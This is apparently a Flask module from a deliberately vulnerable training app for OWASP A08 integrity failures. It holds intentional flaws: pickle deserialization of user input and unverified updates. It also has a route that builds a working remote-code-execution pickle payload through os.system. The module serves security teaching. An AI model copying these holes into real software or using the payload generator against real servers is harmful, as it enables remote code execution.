"""
A08:2025 – Software and Data Integrity Failures
Vulnerabilities:
  - Insecure deserialization: accepts base64-encoded pickle data → RCE
  - No signature/hash verification on "software updates"
  - Unsigned CI/CD webhook executes arbitrary commands
"""
import pickle
import base64
import hashlib
from flask import Blueprint, render_template, request

a08 = Blueprint('a08', __name__)

# Simulated "update manifest" with no signature
UPDATE_MANIFEST = {
    'version': '2.1.0',
    'url': 'http://updates.internal/app-2.1.0.tar.gz',
    'sha256': None,   # BUG: null checksum — never verified
    'signature': None
}


@a08.route('/')
def index():
    return render_template('a08/index.html')


# ── VULNERABLE: pickle deserialization of user input → RCE ───────────────────
@a08.route('/deserialize', methods=['GET', 'POST'])
def deserialize():
    result = error = payload_hint = None
    # Provide a safe example payload for participants
    safe_obj   = {'user': 'alice', 'role': 'admin'}
    safe_bytes = pickle.dumps(safe_obj)
    payload_hint = base64.b64encode(safe_bytes).decode()

    if request.method == 'POST':
        raw = request.form.get('data', '')
        try:
            decoded = base64.b64decode(raw)
            # BUG: deserializing untrusted data
            obj    = pickle.loads(decoded)
            result = repr(obj)
        except Exception as e:
            error = str(e)
    return render_template('a08/deserialize.html', result=result, error=error,
                           payload_hint=payload_hint)


# ── VULNERABLE: update applied without verifying hash or signature ────────────
@a08.route('/update', methods=['GET', 'POST'])
def update():
    message = None
    if request.method == 'POST':
        version = request.form.get('version', '')
        # BUG: no hash check, no signature verification
        message = (
            f"Applying update v{version} from {UPDATE_MANIFEST['url']} "
            f"— skipped integrity check (sha256=None, signature=None)"
        )
    return render_template('a08/update.html', manifest=UPDATE_MANIFEST,
                           message=message)


# ── Helper: generate a malicious pickle payload (educational) ────────────────
@a08.route('/generate-payload', methods=['GET', 'POST'])
def generate_payload():
    """Shows how a malicious pickle payload is crafted — for defense awareness."""
    payload_b64 = None
    command = ''
    if request.method == 'POST':
        command = request.form.get('command', 'id')

        class RCEPayload:
            def __reduce__(self):
                import os
                return (os.system, (command,))

        payload_b64 = base64.b64encode(pickle.dumps(RCEPayload())).decode()
    return render_template('a08/generate_payload.html',
                           payload=payload_b64, command=command)
